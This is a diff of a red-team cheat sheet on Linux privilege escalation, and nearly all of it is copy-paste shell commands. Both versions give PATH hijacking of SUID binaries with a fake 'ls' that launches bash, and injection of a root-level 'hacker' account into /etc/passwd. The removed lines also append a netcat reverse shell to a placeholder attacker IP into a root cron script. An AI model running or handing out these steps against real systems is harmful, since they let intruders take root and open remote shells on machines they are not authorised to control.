@@ -1,36 +1,33 @@
-Linux Privilege Escalation - Technical Reference Guide 
+#  Red Team Notes: Linux Privilege Escalation Core
 
-# [1] ENUMERATION
-whoami && id
-sudo -l
-cat /etc/passwd | cut -d: -f1
-find / -perm -u=s -type f 2>/dev/null
+# 📌 Key Concepts
+* **Enumeration First:** Always start by checking your current user context (`id`), sudo privileges (`sudo -l`), and SUID binaries.
+* **Path Hijacking:** Exploiting SUID binaries that call system commands without absolute paths by poisoning the `$PATH` variable.
+* **Cron Exploitation:** Finding scheduled tasks running as root that point to world-writable scripts or directories.
+* **Sensitive Files:** Checking for write permissions on critical files like `/etc/passwd` or `/etc/shadow` to inject new users or modify hashes.
+* **GTFOBins:** Using the community-driven list of Unix binaries to bypass local security restrictions and escalate privileges.
 
-# [2] PATH HIJACKING (SUID)
-# Execution:
-cd /tmp
-echo "/bin/bash" > ls
-chmod +x ls
-export PATH=$(pwd):$PATH
-# Now run the SUID binary that calls 'ls'
+### 💻 Essential Commands
 
-# [3] CRON JOBS EXPLOITATION
-# Check for writable root scripts:
-cat /etc/crontab
-ls -la /path/to/script.sh
-echo "nc -e /bin/bash [ATTACKER_IP] [PORT]" >> /path/to/script.sh
+```bash
+# [1] SYSTEM ENUMERATION
+id && whoami                    # Check current UID/GID and username
+sudo -l                         # List commands allowed to run with sudo
+find / -perm -u=s -type f 2>/dev/null  # Locate all SUID binaries
 
-# [4] /ETC/PASSWD POISONING
-# Generate password hash:
-openssl passwd -1 -salt user password123
-# If writable, append this line:
-# hacker:$1$user$L9y.S.6...:0:0:root:/root:/bin/bash
+# [2] PATH POISONING
+echo "/bin/bash" > /tmp/ls      # Create malicious 'ls'
+chmod +x /tmp/ls                # Make it executable
+export PATH=/tmp:$PATH          # Prepend /tmp to PATH
 
-# [5] EXTERNAL RESOURCES & CHECKLISTS
-* GTFOBins: https://gtfobins.github.io/
-* PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
-* Linux Checklist (netbiosX): https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
-* OSCP Guide: https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
+# [3] CRON JOB CHECK
+cat /etc/crontab                # View system-wide cron jobs
+ls -la /path/to/script.sh       # Check for write permissions on cron scripts
 
----
-*Verified for Red Team Notes - May 2026*
+# [4] PASSWD INJECTION
+openssl passwd -1 -salt user pass123  # Generate password hash
+# Append to /etc/passwd: hacker:[HASH]:0:0:root:/root:/bin/bash
+
+# [5] USEFUL TOOLS
+# GTFOBins: [https://gtfobins.github.io/](https://gtfobins.github.io/)
+# PayloadsAllTheThings: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
